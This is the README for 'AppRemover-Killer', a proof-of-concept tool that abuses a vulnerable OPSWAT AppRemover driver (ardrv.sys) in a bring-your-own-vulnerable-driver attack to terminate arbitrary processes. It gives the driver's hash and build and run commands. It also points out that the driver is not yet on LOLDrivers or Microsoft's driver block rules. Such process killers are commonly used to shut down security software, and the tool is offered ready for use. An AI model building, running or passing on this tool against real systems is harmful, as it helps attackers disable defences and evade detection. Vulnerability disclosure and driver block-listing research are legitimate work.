# AppRemover-Killer
- PoC for vulnerability in ardrv from OPSWAT AppRemover

- As of 2026-06-19, the driver is **not** listed on [LOLDDrivers](https://www.loldrivers.io/) or in [Microsoft's recommended driver block rules](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules)

Built on [`byovd-lib`](../byovd-lib/) -- implements the `DriverConfig` trait and delegates the full BYOVD flow to the shared library.

**Driver hashes:**
- `ardrv.sys` SHA256: `07c5209bf83065fe760f4fee4ed2308b0c523671f68ca73a3854c2c8c28c0541`

## Usage

Place `ardrv.sys` in the same directory as the executable.

```text
PS C:\Users\User\Desktop> .\AppRemover-Killer.exe -h
BYOVD process killer using ardrv driver

Usage: AppRemover-Killer.exe --name <PROCESS_NAME>

Options:
  -n, --name <PROCESS_NAME>  Target process name (e.g., notepad.exe)
  -h, --help                 Print help
  -V, --version              Print version
```

```bash
# Build
cargo build --release -p AppRemover-Killer

# Run
.\AppRemover-Killer.exe -n notepad.exe
```
